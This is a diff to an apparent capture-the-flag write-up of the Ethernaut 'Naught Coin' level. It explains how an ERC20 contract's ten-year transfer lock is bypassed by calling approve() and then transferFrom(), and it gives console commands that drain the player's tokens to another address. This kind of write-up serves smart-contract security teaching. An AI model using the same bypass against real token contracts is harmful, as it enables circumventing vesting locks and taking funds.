@@ -15,8 +15,15 @@
 
 ## Breakdown & Analysis
 
+1. In the contract, the function `transfer()` is overridden and restricted by a ten-year lock `modifier`.
+2. In the ERC20 standard, there are two methods to transfer tokens out: `transfer()` and `transferFrom()`. In this case, we can utilize `transferFrom()`.
+3. Since `transferFrom()` requires prior approval to transfer our tokens, we need to call `approve()` first.
+4. After approval, call `transferFrom()` to avoid the time lock and transfer all the tokens out.
 
+## Detailed Steps (work through the console)
 
-## Detailed Steps
-
-See [Attack.sol](https://github.com/timou0911/Ethernaut-Writeup/blob/main/15.%20Naught%20Coin%20%E2%98%85%E2%98%85%E2%98%85%E2%98%86%E2%98%86/Attack.sol).
+```js
+await contract.approve(player, toWei("1000000")); // approve ourselves
+await contract.transferFrom(player, "0xd500f37734A4DC70434Be052187161b63763d9d7", toWei("1000000")); // The second parameter can be another account besides the player.
+await contract.balanceOf(player).then(v=>v.toString()); // check if player's balance is 0 now.
+```
